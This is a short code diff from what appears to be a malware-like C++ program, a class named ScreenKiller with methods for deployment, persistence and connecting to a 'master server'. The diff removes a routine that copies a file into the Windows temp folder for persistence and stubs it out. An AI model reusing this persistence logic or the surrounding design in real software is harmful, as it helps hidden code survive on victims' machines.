@@ -69,14 +69,7 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	char filename[] = "mystery";
-	char temp_path[MAX_PATH];
-
-	GetTempPathA(MAX_PATH, temp_path);
-
-	strcat_s(temp_path, MAX_PATH, filename);
-
-	return CopyFileA(filename, temp_path, false) != 0;
+	return false;
 }
 
 bool ScreenKiller::connect_to_master_server()
